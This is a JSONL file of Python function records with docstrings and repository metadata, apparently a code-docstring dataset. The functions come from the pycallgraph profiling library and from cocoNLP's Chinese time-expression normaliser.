{"docstring": "'''Begins a trace.  Setting reset to True will reset all previously\nrecorded trace data.\n'''\n", "func_signal": "def start(self, reset=True):\n", "code": "if not self.output:\n    raise PyCallGraphException(\n        'No outputs declared. Please see the '\n        'examples in the online documentation.'\n    )\n\nif reset:\n    self.reset()\n\nfor output in self.output:\n    output.start()\n\nself.tracer.start()", "path": "pycallgraph/pycallgraph/pycallgraph.py", "commit_date": "2015-05-28 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
{"docstring": "\"\"\"\nDecorator that will run the function and print a line-by-line profile\n\"\"\"\n", "func_signal": "def profile(func, stream=None):\n", "code": "def wrapper(*args, **kwargs):\n    prof = LineProfiler()\n    val = prof(func)(*args, **kwargs)\n    show_results(prof, stream=stream)\n    return val\nreturn wrapper", "path": "pycallgraph/pycallgraph/memory_profiler.py", "commit_date": "2013-07-11 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
{"docstring": "\"\"\" Profile a single executable statment in the main namespace.\n\"\"\"\n", "func_signal": "def run(self, cmd):\n", "code": "import __main__\nmain_dict = __main__.__dict__\nreturn self.runctx(cmd, main_dict, main_dict)", "path": "pycallgraph/pycallgraph/memory_profiler.py", "commit_date": "2013-07-11 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
{"docstring": "\"\"\"This is called to load the module as an IPython extension.\"\"\"\n", "func_signal": "def load_ipython_extension(ip):\n", "code": "ip.define_magic('mprun', magic_mprun)\nip.define_magic('memit', magic_memit)", "path": "pycallgraph/pycallgraph/memory_profiler.py", "commit_date": "2013-07-11 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
{"docstring": "\"\"\" Wrap a function to profile it.\n\"\"\"\n\n", "func_signal": "def wrap_function(self, func):\n", "code": "def f(*args, **kwds):\n    self.enable_by_count()\n    try:\n        result = func(*args, **kwds)\n    finally:\n        self.disable_by_count()\n    return result\nreturn f", "path": "pycallgraph/pycallgraph/memory_profiler.py", "commit_date": "2013-07-11 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
{"docstring": "'''Make a higher total time have an orange colour and a higher number\nof calls have a green colour using RGB.\n'''\n", "func_signal": "def orange_green(node):\n", "code": "return Color(\n    0.2 + node.time.fraction * 0.8,\n    0.2 + node.calls.fraction * 0.4 + node.time.fraction * 0.4,\n    0.2,\n)", "path": "pycallgraph/examples/graphviz/colors.py", "commit_date": "2013-09-15 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
{"docstring": "'''\nThis is a quick hack to move the config variables set in Config into\nthe output module config variables.\n'''\n", "func_signal": "def set_config(self, config):\n", "code": "for k, v in config.__dict__.iteritems():\n    if hasattr(self, k) and \\\n            callable(getattr(self, k)):\n        continue\n    setattr(self, k, v)", "path": "pycallgraph/pycallgraph/output/output.py", "commit_date": "2014-11-06 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
{"docstring": "\"\"\" Execute a statement under the line-by-line memory profiler from the\nmemory_profilser module.\n\nUsage:\n  %mprun -f func1 -f func2 <statement>\n\nThe given statement (which doesn't require quote marks) is run via the\nLineProfiler. Profiling is enabled for the functions specified by the -f\noptions. The statistics will be shown side-by-side with the code through\nthe pager once the statement has completed.\n\nOptions:\n\n-f <function>: LineProfiler only profiles functions and methods it is told\nto profile.  This option tells the profiler about these functions. Multiple\n-f options may be used. The argument may be any expression that gives\na Python function or method object. However, one must be careful to avoid\nspaces that may confuse the option parser. Additionally, functions defined\nin the interpreter at the In[] prompt or via %run currently cannot be\ndisplayed.  Write these functions out to a separate file and import them.\n\nOne or more -f options are required to get any useful results.\n\n-T <filename>: dump the text-formatted statistics with the code\nside-by-side out to a text file.\n\n-r: return the LineProfiler object after it has completed profiling.\n\"\"\"\n", "func_signal": "def magic_mprun(self, parameter_s=''):\n", "code": "try:\n    from StringIO import StringIO\nexcept ImportError: # Python 3.x\n    from io import StringIO\n\n# Local imports to avoid hard dependency.\nfrom distutils.version import LooseVersion\nimport IPython\nipython_version = LooseVersion(IPython.__version__)\nif ipython_version < '0.11':\n    from IPython.genutils import page\n    from IPython.ipstruct import Struct\n    from IPython.ipapi import UsageError\nelse:\n    from IPython.core.page import page\n    from IPython.utils.ipstruct import Struct\n    from IPython.core.error import UsageError\n\n# Escape quote markers.\nopts_def = Struct(T=[''], f=[])\nparameter_s = parameter_s.replace('\"', r'\\\"').replace(\"'\", r\"\\'\")\nopts, arg_str = self.parse_options(parameter_s, 'rf:T:', list_all=True)\nopts.merge(opts_def)\nglobal_ns = self.shell.user_global_ns\nlocal_ns = self.shell.user_ns\n\n# Get the requested functions.\nfuncs = []\nfor name in opts.f:\n    try:\n        funcs.append(eval(name, global_ns, local_ns))\n    except Exception as e:\n        raise UsageError('Could not find function %r.\\n%s: %s' % (name,\n            e.__class__.__name__, e))\n\nprofile = LineProfiler()\nfor func in funcs:\n    profile(func)\n\n# Add the profiler to the builtins for @profile.\ntry:\n    import builtins\nexcept ImportError:  # Python 3x\n    import __builtin__ as builtins\n\nif 'profile' in builtins.__dict__:\n    had_profile = True\n    old_profile = builtins.__dict__['profile']\nelse:\n    had_profile = False\n    old_profile = None\nbuiltins.__dict__['profile'] = profile\n\ntry:\n    try:\n        profile.runctx(arg_str, global_ns, local_ns)\n        message = ''\n    except SystemExit:\n        message = \"*** SystemExit exception caught in code being profiled.\"\n    except KeyboardInterrupt:\n        message = (\"*** KeyboardInterrupt exception caught in code being \"\n            \"profiled.\")\nfinally:\n    if had_profile:\n        builtins.__dict__['profile'] = old_profile\n\n# Trap text output.\nstdout_trap = StringIO()\nshow_results(profile, stdout_trap)\noutput = stdout_trap.getvalue()\noutput = output.rstrip()\n\nif ipython_version < '0.11':\n    page(output, screen_lines=self.shell.rc.screen_length)\nelse:\n    page(output)\nprint(message,)\n\ntext_file = opts.T[0]\nif text_file:\n    with open(text_file, 'w') as pfile:\n        pfile.write(output)\n    print('\\n*** Profile printout saved to text file %s. %s' % (text_file,\n                                                                message))\n\nreturn_value = None\nif 'r' in opts:\n    return_value = profile\n\nreturn return_value", "path": "pycallgraph/pycallgraph/memory_profiler.py", "commit_date": "2013-07-11 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
{"docstring": "# If in threaded mode, wait for the processor thread to complete\n", "func_signal": "def generate(self):\n", "code": "self.tracer.done()\n\nfor output in self.output:\n    output.done()", "path": "pycallgraph/pycallgraph/pycallgraph.py", "commit_date": "2015-05-28 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
{"docstring": "'''Mixing subparsers with positional arguments can be done with a\nparents option. Found via: http://stackoverflow.com/a/11109863/11125\n'''\n", "func_signal": "def create_parent_parser(self):\n", "code": "parent_parser = argparse.ArgumentParser(add_help=False)\nparent_parser.add_argument(\n    'command', metavar='SCRIPT',\n    help='The Python script file to profile',\n)\nparent_parser.add_argument(\n    'command_args', metavar='ARG', nargs='*',\n    help='Python script arguments.'\n)\nreturn parent_parser", "path": "pycallgraph/pycallgraph/config.py", "commit_date": "2014-02-19 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
{"docstring": "'''Simple memoization for functions without keyword arguments.\n\nThis is useful for mapping code objects to module in this context.\ninspect.getmodule() requires a number of system calls, which may slow down\nthe tracing considerably. Caching the mapping from code objects (there is\n*one* code object for each function, regardless of how many simultaneous\nactivations records there are).\n\nIn this context we can ignore keyword arguments, but a generic memoizer\nought to take care of that as well.\n'''\n\n", "func_signal": "def simple_memoize(callable_object):\n", "code": "cache = dict()\n\ndef wrapper(*rest):\n    if rest not in cache:\n        cache[rest] = callable_object(*rest)\n    return cache[rest]\n\nreturn wrapper", "path": "pycallgraph/pycallgraph/tracer.py", "commit_date": "2014-02-19 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
{"docstring": "'''Used by the pycallgraph command line interface to parse\narguments.\n'''\n", "func_signal": "def create_parser(self):\n", "code": "usage = 'pycallgraph [options] OUTPUT_TYPE [output_options] -- ' \\\n    'SCRIPT.py [ARG ...]'\n\nself.parser = argparse.ArgumentParser(\n    description='Python Call Graph profiles a Python script and '\n    'generates a call graph visualization.', usage=usage,\n)\n\nself.add_ungrouped_arguments()\nself.add_filter_arguments()\nself.add_module_arguments(usage)", "path": "pycallgraph/pycallgraph/config.py", "commit_date": "2014-02-19 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
{"docstring": "'''Used for when creating a pickle. Certain instance variables can't\npickled and aren't used anyway.\n'''\n", "func_signal": "def __getstate__(self):\n", "code": "odict = self.__dict__.copy()\ndont_keep = [\n    'outputs',\n    'config',\n    'updatables',\n    'lib_path',\n]\nfor key in dont_keep:\n    del odict[key]\n\nreturn odict", "path": "pycallgraph/pycallgraph/tracer.py", "commit_date": "2014-02-19 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
{"docstring": "\"\"\" Profile a single executable statement in the given namespaces.\n\"\"\"\n", "func_signal": "def runctx(self, cmd, globals, locals):\n", "code": "self.enable_by_count()\ntry:\n    exec(cmd, globals, locals)\nfinally:\n    self.disable_by_count()\nreturn self", "path": "pycallgraph/pycallgraph/memory_profiler.py", "commit_date": "2013-07-11 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
{"docstring": "'''Returns a string with the contents of a DOT file for Graphviz to\nparse.\n'''\n", "func_signal": "def generate(self):\n", "code": "indent_join = '\\n' + ' ' * 12\n\nreturn textwrap.dedent('''\\\ndigraph G {{\n\n    // Attributes\n    {0}\n\n    // Groups\n    {1}\n\n    // Nodes\n    {2}\n\n    // Edges\n    {3}\n\n}}\n'''.format(\n    indent_join.join(self.generate_attributes()),\n    indent_join.join(self.generate_groups()),\n    indent_join.join(self.generate_nodes()),\n    indent_join.join(self.generate_edges()),\n))", "path": "pycallgraph/pycallgraph/output/graphviz.py", "commit_date": "2015-08-28 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
{"docstring": "\"\"\" Enable the profiler if it hasn't been enabled before.\n\"\"\"\n", "func_signal": "def enable_by_count(self):\n", "code": "if self.enable_count == 0:\n    self.enable()\nself.enable_count += 1", "path": "pycallgraph/pycallgraph/memory_profiler.py", "commit_date": "2013-07-11 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
{"docstring": "'''\nYou can set defaults in the constructor, e.g. Config(verbose=True)\n'''\n", "func_signal": "def __init__(self, **kwargs):\n", "code": "self.output = None\nself.verbose = False\nself.debug = False\nself.groups = True\nself.threaded = False\nself.memory = False\n\n# Filtering\nself.include_stdlib = False\nself.include_pycallgraph = False\nself.max_depth = 99999\n\nself.trace_filter = GlobbingFilter(\n    exclude=['pycallgraph.*'],\n    include=['*'],\n)\n\n# Grouping\nself.trace_grouper = Grouper()\n\nself.did_init = True\n\n# Update the defaults with anything from kwargs\n[setattr(self, k, v) for k, v in kwargs.iteritems()]\n\nself.create_parser()", "path": "pycallgraph/pycallgraph/config.py", "commit_date": "2014-02-19 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
{"docstring": "'''output can be a single Output instance or an iterable with many\nof them.  Example usage:\n\n    PyCallGraph(output=GraphvizOutput(), config=Config())\n'''\n", "func_signal": "def __init__(self, output=None, config=None):\n", "code": "locale.setlocale(locale.LC_ALL, '')\n\nif output is None:\n    self.output = []\nelif isinstance(output, Output):\n    self.output = [output]\nelse:\n    self.output = output\n\nself.config = config or Config()\n\nconfigured_ouput = self.config.get_output()\nif configured_ouput:\n    self.output.append(configured_ouput)\n\nself.reset()", "path": "pycallgraph/pycallgraph/pycallgraph.py", "commit_date": "2015-05-28 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
{"docstring": "\"\"\"Measure memory usage of a Python statement\n\nUsage, in line mode:\n  %memit [-r<R>t<T>] statement\n\nOptions:\n-r<R>: repeat the loop iteration <R> times and take the best result.\nDefault: 1\n\n-t<T>: timeout after <T> seconds. Unused if `-i` is active. Default: None\n\nExamples\n--------\n::\n\n  In [1]: import numpy as np\n\n  In [2]: %memit np.zeros(1e7)\n  maximum of 1: 76.402344 MB per loop\n\n  In [3]: %memit np.ones(1e6)\n  maximum of 1: 7.820312 MB per loop\n\n  In [4]: %memit -r 10 np.empty(1e8)\n  maximum of 10: 0.101562 MB per loop\n\n  In [5]: memit -t 3 while True: pass;\n  Subprocess timed out.\n  Subprocess timed out.\n  Subprocess timed out.\n  ERROR: all subprocesses exited unsuccessfully. Try again with the `-i`\n  option.\n  maximum of 1: -inf MB per loop\n\n\"\"\"\n", "func_signal": "def magic_memit(self, line=''):\n", "code": "opts, stmt = self.parse_options(line, 'r:t:i', posix=False, strict=False)\nrepeat = int(getattr(opts, 'r', 1))\nif repeat < 1:\n    repeat == 1\ntimeout = int(getattr(opts, 't', 0))\nif timeout <= 0:\n    timeout = None\n\nmem_usage = []\nfor _ in range(repeat):\n    tmp = memory_usage((_func_exec, (stmt, self.shell.user_ns)), timeout=timeout)\n    mem_usage.extend(tmp)\n\nif mem_usage:\n    print('maximum of %d: %f MB per loop' % (repeat, max(mem_usage)))\nelse:\n    print('ERROR: could not read memory usage, try with a lower interval or more iterations')", "path": "pycallgraph/pycallgraph/memory_profiler.py", "commit_date": "2013-07-11 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
{"docstring": "\"\"\"\n\u65e5-\u89c4\u8303\u5316\u65b9\u6cd5\uff1a\u8be5\u65b9\u6cd5\u8bc6\u522b\u65f6\u95f4\u8868\u8fbe\u5f0f\u5355\u5143\u7684\u65e5\u5b57\u6bb5\n:return:\n\"\"\"\n", "func_signal": "def norm_setday(self):\n", "code": "rule = u\"((?<!\\\\d))([0-3][0-9]|[1-9])(?=(\u65e5|\u53f7))\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    self.tp.tunit[2] = int(match.group())\n    # \u5904\u7406\u503e\u5411\u4e8e\u672a\u6765\u65f6\u95f4\u7684\u60c5\u51b5\n    self.preferFuture(2)\n    self._check_time(self.tp.tunit)", "path": "cocoNLP/dist/cocoNLP-0.0.9/cocoNLP/config/basic/time_nlp/TimeUnit.py", "commit_date": "2018-12-24 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
{"docstring": "# \u8fd9\u91cc\u5bf9\u4e8e\u4e0b\u4e2a\u5468\u672b\u8fd9\u79cd\u505a\u8f6c\u5316 \u628a\u4e2a\u7ed9\u79fb\u9664\u6389\n", "func_signal": "def _filter(self, input_query):\n", "code": "input_query = StringPreHandler.numberTranslator(input_query)\n\nrule = u\"[0-9]\u6708[0-9]\"\npattern = re.compile(rule)\nmatch = pattern.search(input_query)\nif match != None:\n    index = input_query.find('\u6708')\n    rule = u\"\u65e5|\u53f7\"\n    pattern = re.compile(rule)\n    match = pattern.search(input_query[index:])\n    if match == None:\n        rule = u\"[0-9]\u6708[0-9]+\"\n        pattern = re.compile(rule)\n        match = pattern.search(input_query)\n        if match != None:\n            end = match.span()[1]\n            input_query = input_query[:end] + '\u53f7' + input_query[end:]\n\nrule = u\"\u6708\"\npattern = re.compile(rule)\nmatch = pattern.search(input_query)\nif match == None:\n    input_query = input_query.replace('\u4e2a', '')\n\ninput_query = input_query.replace('\u4e2d\u65ec', '15\u53f7')\ninput_query = input_query.replace('\u508d\u665a', '\u5348\u540e')\ninput_query = input_query.replace('\u5927\u5e74', '')\ninput_query = input_query.replace('\u4e94\u4e00', '\u52b3\u52a8\u8282')\ninput_query = input_query.replace('\u767d\u5929', '\u65e9\u4e0a')\ninput_query = input_query.replace('\uff1a', ':')\nreturn input_query", "path": "cocoNLP/dist/cocoNLP-0.0.9/cocoNLP/config/basic/time_nlp/TimeNormalizer.py", "commit_date": "2018-12-24 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
{"docstring": "\"\"\"\n\u5206-\u89c4\u8303\u5316\u65b9\u6cd5\uff1a\u8be5\u65b9\u6cd5\u8bc6\u522b\u65f6\u95f4\u8868\u8fbe\u5f0f\u5355\u5143\u7684\u5206\u5b57\u6bb5\n:return:\n\"\"\"\n", "func_signal": "def norm_setminute(self):\n", "code": "rule = u\"([0-9]+(?=\u5206(?!\u949f)))|((?<=((?<!\u5c0f)[\u70b9\u65f6]))[0-5]?[0-9](?!\u523b))\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    if match.group() != '':\n        self.tp.tunit[4] = int(match.group())\n        # \u5904\u7406\u503e\u5411\u4e8e\u672a\u6765\u65f6\u95f4\u7684\u60c5\u51b5\n        # self.preferFuture(4)\n        self.isAllDayTime = False\n# \u52a0\u5bf9\u4e00\u523b\uff0c\u534a\uff0c3\u523b\u7684\u6b63\u786e\u8bc6\u522b\uff081\u523b\u4e3a15\u5206\uff0c\u534a\u4e3a30\u5206\uff0c3\u523b\u4e3a45\u5206\uff09\nrule = u\"(?<=[\u70b9\u65f6])[1\u4e00]\u523b(?!\u949f)\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    self.tp.tunit[4] = 15\n    # \u5904\u7406\u503e\u5411\u4e8e\u672a\u6765\u65f6\u95f4\u7684\u60c5\u51b5\n    # self.preferFuture(4)\n    self.isAllDayTime = False\n\nrule = u\"(?<=[\u70b9\u65f6])\u534a\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    self.tp.tunit[4] = 30\n    # \u5904\u7406\u503e\u5411\u4e8e\u672a\u6765\u65f6\u95f4\u7684\u60c5\u51b5\n    self.preferFuture(4)\n    self.isAllDayTime = False\n\nrule = u\"(?<=[\u70b9\u65f6])[3\u4e09]\u523b(?!\u949f)\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    self.tp.tunit[4] = 45\n    # \u5904\u7406\u503e\u5411\u4e8e\u672a\u6765\u65f6\u95f4\u7684\u60c5\u51b5\n    # self.preferFuture(4)\n    self.isAllDayTime = False", "path": "cocoNLP/dist/cocoNLP-0.0.9/cocoNLP/config/basic/time_nlp/TimeUnit.py", "commit_date": "2018-12-24 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
{"docstring": "\"\"\"\n\u6839\u636e\u4e0a\u4e0b\u6587\u65f6\u95f4\u8865\u5145\u65f6\u95f4\u4fe1\u606f\n:param checkTimeIndex:\n:return:\n\"\"\"\n", "func_signal": "def checkContextTime(self, checkTimeIndex):\n", "code": "for i in range(0, checkTimeIndex):\n    if self.tp.tunit[i] == -1 and self.tp_origin.tunit[i] != -1:\n        self.tp.tunit[i] = self.tp_origin.tunit[i]\n# \u5728\u5904\u7406\u5c0f\u65f6\u8fd9\u4e2a\u7ea7\u522b\u65f6\uff0c\u5982\u679c\u4e0a\u6587\u65f6\u95f4\u662f\u4e0b\u5348\u7684\u4e14\u4e0b\u6587\u6ca1\u6709\u4e3b\u52a8\u58f0\u660e\u5c0f\u65f6\u7ea7\u522b\u4ee5\u4e0a\u7684\u65f6\u95f4\uff0c\u5219\u4e5f\u628a\u4e0b\u6587\u65f6\u95f4\u8bbe\u4e3a\u4e0b\u5348\nif self.isFirstTimeSolveContext is True and checkTimeIndex == 3 and self.tp_origin.tunit[\n    checkTimeIndex] >= 12 and self.tp.tunit[checkTimeIndex] < 12:\n    self.tp.tunit[checkTimeIndex] += 12\nself.isFirstTimeSolveContext = False", "path": "cocoNLP/dist/cocoNLP-0.0.9/cocoNLP/config/basic/time_nlp/TimeUnit.py", "commit_date": "2018-12-24 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
{"docstring": "\"\"\"\n\u8bbe\u7f6e\u65f6\u95f4\u957f\u5ea6\u76f8\u5173\u7684\u65f6\u95f4\u8868\u8fbe\u5f0f\n:return:\n\"\"\"\n", "func_signal": "def norm_setSpanRelated(self):\n", "code": "rule = u\"\\\\d+(?=\u4e2a\u6708(?![\u4ee5\u4e4b]?[\u524d\u540e]))\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    self.normalizer.isTimeSpan = True\n    month = int(match.group())\n    self.tp.tunit[1] = int(month)\n\nrule = u\"\\\\d+(?=\u5929(?![\u4ee5\u4e4b]?[\u524d\u540e]))\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    self.normalizer.isTimeSpan = True\n    day = int(match.group())\n    self.tp.tunit[2] = int(day)\n\nrule = u\"\\\\d+(?=(\u4e2a)?\u5c0f\u65f6(?![\u4ee5\u4e4b]?[\u524d\u540e]))\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    self.normalizer.isTimeSpan = True\n    hour = int(match.group())\n    self.tp.tunit[3] = int(hour)\n\nrule = u\"\\\\d+(?=\u5206\u949f(?![\u4ee5\u4e4b]?[\u524d\u540e]))\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    self.normalizer.isTimeSpan = True\n    minute = int(match.group())\n    self.tp.tunit[4] = int(minute)\n\nrule = u\"\\\\d+(?=\u79d2\u949f(?![\u4ee5\u4e4b]?[\u524d\u540e]))\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    self.normalizer.isTimeSpan = True\n    second = int(match.group())\n    self.tp.tunit[5] = int(second)\n\nrule = u\"\\\\d+(?=(\u4e2a)?(\u5468|\u661f\u671f|\u793c\u62dc)(?![\u4ee5\u4e4b]?[\u524d\u540e]))\"\npattern = re.compile(rule)\nmatch = pattern.search(self.exp_time)\nif match is not None:\n    self.normalizer.isTimeSpan = True\n    week = int(match.group())\n    if self.tp.tunit[2] == -1:\n        self.tp.tunit[2] = 0\n    self.tp.tunit[2] += int(week * 7)", "path": "cocoNLP/dist/cocoNLP-0.0.9/cocoNLP/config/basic/time_nlp/TimeUnit.py", "commit_date": "2018-12-24 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
{"docstring": "\"\"\"\n\u5982\u679c\u7528\u6237\u9009\u9879\u662f\u503e\u5411\u4e8e\u672a\u6765\u65f6\u95f4\uff0c\u68c0\u67e5checkTimeIndex\u6240\u6307\u7684\u65f6\u95f4\u662f\u5426\u662f\u8fc7\u53bb\u7684\u65f6\u95f4\uff0c\u5982\u679c\u662f\u7684\u8bdd\uff0c\u5c06\u5927\u4e00\u7ea7\u7684\u65f6\u95f4\u8bbe\u4e3a\u5f53\u524d\u65f6\u95f4\u7684+1\u3002\n\u5982\u5728\u665a\u4e0a\u8bf4\u201c\u65e9\u4e0a8\u70b9\u770b\u4e66\u201d\uff0c\u5219\u8bc6\u522b\u4e3a\u660e\u5929\u65e9\u4e0a;\n12\u670831\u65e5\u8bf4\u201c3\u53f7\u4e70\u83dc\u201d\uff0c\u5219\u8bc6\u522b\u4e3a\u660e\u5e741\u6708\u76843\u53f7\u3002\n:param checkTimeIndex: _tp.tunit\u65f6\u95f4\u6570\u7ec4\u7684\u4e0b\u6807\n:return:\n\"\"\"\n# 1. \u68c0\u67e5\u88ab\u68c0\u67e5\u7684\u65f6\u95f4\u7ea7\u522b\u4e4b\u524d\uff0c\u662f\u5426\u6ca1\u6709\u66f4\u9ad8\u7ea7\u7684\u5df2\u7ecf\u786e\u5b9a\u7684\u65f6\u95f4\uff0c\u5982\u679c\u6709\uff0c\u5219\u4e0d\u8fdb\u884c\u5904\u7406.\n", "func_signal": "def preferFuture(self, checkTimeIndex):\n", "code": "for i in range(0, checkTimeIndex):\n    if self.tp.tunit[i] != -1:\n        return\n# 2. \u6839\u636e\u4e0a\u4e0b\u6587\u8865\u5145\u65f6\u95f4\nself.checkContextTime(checkTimeIndex)\n# 3. \u6839\u636e\u4e0a\u4e0b\u6587\u8865\u5145\u65f6\u95f4\u540e\u518d\u6b21\u68c0\u67e5\u88ab\u68c0\u67e5\u7684\u65f6\u95f4\u7ea7\u522b\u4e4b\u524d\uff0c\u662f\u5426\u6ca1\u6709\u66f4\u9ad8\u7ea7\u7684\u5df2\u7ecf\u786e\u5b9a\u7684\u65f6\u95f4\uff0c\u5982\u679c\u6709\uff0c\u5219\u4e0d\u8fdb\u884c\u503e\u5411\u5904\u7406.\nfor i in range(0, checkTimeIndex):\n    if self.tp.tunit[i] != -1:\n        return\n\n# 4. \u786e\u8ba4\u7528\u6237\u9009\u9879\nif not self.normalizer.isPreferFuture:\n    return\n# 5. \u83b7\u53d6\u5f53\u524d\u65f6\u95f4\uff0c\u5982\u679c\u8bc6\u522b\u5230\u7684\u65f6\u95f4\u5c0f\u4e8e\u5f53\u524d\u65f6\u95f4\uff0c\u5219\u5c06\u5176\u4e0a\u7684\u6240\u6709\u7ea7\u522b\u65f6\u95f4\u8bbe\u7f6e\u4e3a\u5f53\u524d\u65f6\u95f4\uff0c\u5e76\u4e14\u5176\u4e0a\u4e00\u7ea7\u7684\u65f6\u95f4\u6b65\u957f+1\ntime_arr = self.normalizer.timeBase.split('-')\ncur = arrow.get(self.normalizer.timeBase, \"YYYY-M-D-H-m-s\")\ncur_unit = int(time_arr[checkTimeIndex])\n# print(time_arr)\n# print(self.tp.tunit)\nif self.tp.tunit[0] == -1:\n    self._noyear = True\nelse:\n    self._noyear = False\nif cur_unit < self.tp.tunit[checkTimeIndex]:\n    return\n# if cur_unit == self.tp.tunit[checkTimeIndex]:\n#     down_unit = int(time_arr[checkTimeIndex + 1])\n#     if down_unit\n# \u51c6\u5907\u589e\u52a0\u7684\u65f6\u95f4\u5355\u4f4d\u662f\u88ab\u68c0\u67e5\u7684\u65f6\u95f4\u7684\u4e0a\u4e00\u7ea7\uff0c\u5c06\u4e0a\u4e00\u7ea7\u65f6\u95f4+1\ncur = self.addTime(cur, checkTimeIndex - 1)\ntime_arr = cur.format(\"YYYY-M-D-H-m-s\").split('-')\nfor i in range(0, checkTimeIndex):\n    self.tp.tunit[i] = int(time_arr[i])\n    # if i == 1:\n    #     self.tp.tunit[i] += 1", "path": "cocoNLP/dist/cocoNLP-0.0.9/cocoNLP/config/basic/time_nlp/TimeUnit.py", "commit_date": "2018-12-24 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
{"docstring": "\"\"\"\nTimeNormalizer\u7684\u6784\u9020\u65b9\u6cd5\uff0ctimeBase\u53d6\u9ed8\u8ba4\u7684\u7cfb\u7edf\u5f53\u524d\u65f6\u95f4\n:param timeBase: \u57fa\u51c6\u65f6\u95f4\u70b9\n:param target: \u5f85\u5206\u6790\u5b57\u7b26\u4e32\n:return: \u65f6\u95f4\u5355\u5143\u6570\u7ec4\n\"\"\"\n", "func_signal": "def parse(self, target, timeBase=arrow.now()):\n", "code": "self.isTimeSpan = False\nself.invalidSpan = False\nself.timeSpan = ''\nself.target = self._filter(target)\nself.timeBase = arrow.get(timeBase).format('YYYY-M-D-H-m-s')\nself.nowTime = timeBase\nself.oldTimeBase = self.timeBase\nself.__preHandling()\nself.timeToken = self.__timeEx()\ndic = {}\nres = self.timeToken\n\nif self.isTimeSpan:\n\n    if self.invalidSpan:\n        dic['error'] = 'no time pattern could be extracted.'\n    else:\n        result = {}\n        dic['type'] = 'timedelta'\n        dic['timedelta'] = self.timeSpan\n        # print(dic['timedelta'])\n        index = dic['timedelta'].find('days')\n\n        days = int(dic['timedelta'][:index-1])\n        result['year'] = int(days / 365)\n        result['month'] = int(days / 30 - result['year'] * 12)\n        result['day'] = int(days - result['year'] * 365 - result['month'] * 30)\n        index = dic['timedelta'].find(',')\n        time = dic['timedelta'][index+1:]\n        time = time.split(':')\n        result['hour'] = int(time[0])\n        result['minute'] = int(time[1])\n        result['second'] = int(time[2])\n        dic['timedelta'] = result\nelse:\n    if len(res) == 0:\n        dic['error'] = 'no time pattern could be extracted.'\n    elif len(res) == 1:\n        dic['type'] = 'timestamp'\n        dic['timestamp'] = res[0].time.format(\"YYYY-MM-DD HH:mm:ss\")\n    else:\n        dic['type'] = 'timespan'\n        dic['timespan'] = [res[0].time.format(\"YYYY-MM-DD HH:mm:ss\"), res[1].time.format(\"YYYY-MM-DD HH:mm:ss\")]\nreturn json.dumps(dic)", "path": "cocoNLP/dist/cocoNLP-0.0.9/cocoNLP/config/basic/time_nlp/TimeNormalizer.py", "commit_date": "2018-12-24 00:00:00", "repo_name": "fighting41love/cocoNLP", "stars": 1071, "license": "None", "language": "python", "size": 933}
